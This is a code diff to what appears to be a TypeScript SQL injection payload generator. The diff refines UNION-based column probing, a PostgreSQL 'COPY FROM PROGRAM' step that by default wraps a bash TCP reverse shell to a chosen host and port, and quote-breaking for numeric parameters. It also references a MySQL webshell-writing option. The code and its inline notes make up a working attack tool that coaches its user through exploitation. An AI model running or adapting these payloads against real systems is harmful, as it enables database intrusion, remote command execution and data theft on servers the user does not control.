@@ -125,6 +125,14 @@ const STEP_CORE: Record<Step, (c: Ctx) => Core> = {
   "column-count": (c) => ({ inject: `ORDER BY ${c.v.columns ?? 1}`, plain: null }),
   "reflected-columns": (c) => {
     const n = c.v.columns;
+    const strict = c.engine === "mssql" || c.engine === "postgres" || c.engine === "oracle";
+    const r = c.v.reflected ?? 1;
+    if (n && r > n) throw new Error(`reflected column ${r} is beyond ${n} columns`);
+    if (strict) {
+      // Strict engines reject a string in a non-text column, so label ONE column and keep NULL elsewhere.
+      c.notes.push(`${c.engine} errors if a string lands in a non-text column, so this labels only column ${r} and keeps NULL elsewhere. Send it once per column (set reflected to 1, 2, 3...): the label that shows on the page marks a shown text column; a type error means that column is not text.`);
+      return { inject: `AND 1=2 ${unionRow(c, { [r]: `'c${r}'` })}`, plain: null };
+    }
     const labels = n && n >= 1 ? Object.fromEntries(Array.from({ length: n }, (_, i) => [i + 1, `'c${i + 1}'`])) : {};
     return { inject: `AND 1=2 ${unionRow(c, labels)}`, plain: null };
   },
@@ -179,6 +187,7 @@ function embeddedShell(c: Ctx, id: string, ctx: "bash-prompt" | "cmd"): string {
   const b = buildPayload(def, ctx, { LHOST: c.v.LHOST ?? "", LPORT: c.v.LPORT ?? "", FILE: "" });
   for (const u of b.unresolved) if (!c.unresolved.includes(u)) c.unresolved.push(u);
   c.listener = b.listener;
+  c.extra.push(...b.parts);
   c.notes.push(...b.notes.filter((n) => n.startsWith("Serve it first") || n.startsWith("LHOST and LPORT are baked")));
   return b.text;
 }
@@ -199,10 +208,10 @@ const EXEC_CORE: Record<Exec, (c: Ctx) => Core> = {
   "postgres-copy-program": (c) => {
     const table = ident(c, "TABLE", c.v.table?.trim() || "cmd_exec");
     const prog = c.v.cmd?.trim() ? c.v.cmd.trim() : `bash -c "${embeddedShell(c, "bash-tcp", "bash-prompt")}"`;
-    c.notes.push(`Create the table once first: CREATE TABLE ${table}(cmd_output text); then run this. COPY output lands in the table (read it with a SELECT).`);
+    c.notes.push(`Creates ${table} if missing, then COPY loads the command output into it (read it back with a SELECT).`);
     c.notes.push("Wrapped in bash -c \"...\" because the program runs under sh, and \" avoids doubling quotes in the SQL string.");
     if (c.point === "url-param") c.notes.push("> and & become %3E and %26 so the URL parser does not split the request; the -c flag stays raw.");
-    const s = `COPY ${table} FROM PROGRAM ${lit(prog)};`;
+    const s = `CREATE TABLE IF NOT EXISTS ${table}(cmd_output text); COPY ${table} FROM PROGRAM ${lit(prog)};`;
     return { inject: s, plain: s, stacked: true };
   },
   "mysql-into-outfile-webshell": (c) => {
@@ -237,7 +246,11 @@ export function buildSql(stepOrExecId: string, engine: SqlEngine, point: SqlPoin
   const core = exec ? EXEC_CORE[exec.id](c) : STEP_CORE[step!.id as Step](c);
 
   const session = point === "client-session";
-  const prefix = values.prefix ?? "'";
+  let prefix = values.prefix ?? "'";
+  if (core.bare && prefix === "" && !session) {
+    prefix = "'";
+    c.notes.push("Numeric context has no quote to break, but a lone ' still breaks the query. If it does not error, try 1/0 or 1 AND 1=1 instead.");
+  }
   let raw: string;
   if (session) {
     if (core.plain === null) throw new Error(`${stepOrExecId} is an injection step: it does not apply in a client session`);
@@ -254,6 +267,7 @@ export function buildSql(stepOrExecId: string, engine: SqlEngine, point: SqlPoin
   if (!session && prefix === "") parts.push({ token: "(no prefix)", explain: "Numeric context: the value is not quoted, so no break is needed." });
   if (core.stacked && !session) parts.push({ token: ";", explain: "; ends the app's statement and starts a new one (a stacked query). Works on MSSQL and PostgreSQL, usually not on MySQL from PHP." });
   parts.push(...keywordParts(raw));
+  parts.push(...c.extra);
   if (engine === "mysql" && !session && !core.bare) parts.push({ token: "# (alternative)", explain: "MySQL also accepts # as the comment; send it as %23 in a URL." });
 
   const notes = [...c.notes];
